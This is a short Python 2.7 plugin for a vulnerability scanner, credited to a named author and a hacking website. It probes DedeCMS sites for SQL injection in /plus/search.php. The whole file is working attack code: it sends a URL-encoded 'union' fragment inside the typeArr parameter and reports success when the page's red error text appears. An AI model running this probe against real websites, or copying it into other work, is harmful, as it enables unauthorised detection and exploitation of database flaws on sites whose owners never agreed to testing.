#/usr/bin/python2.7
#coding=utf8
#by shaoxiao QQ:1006079161 http://www.mdbhack.com

#############dedecms注射漏洞##################### 

import urllib2
import re   

class dedecmsinjection:
    support = 'dedecms'
    def isSupport(self,servie):
        if servie in self.support:
            return True
        else:
            return False
        
    def scan(self,arg,servie):
        if not self.isSupport(servie):
            return None
        self.url = arg
        html = None
        try:
            html = urllib2.urlopen(self.url+'/plus/search.php?keyword=as&typeArr%5B1%20%75%4E%69%6F%6E%201%5D=a',timeout=5).read()
        except:
            return False
        if html:
            r = r"<font size='5' color='red'>(.*?)</font>"
            m = re.findall(r,html)
            if m:
                print 'search_php Sqlinjection'+m[0]
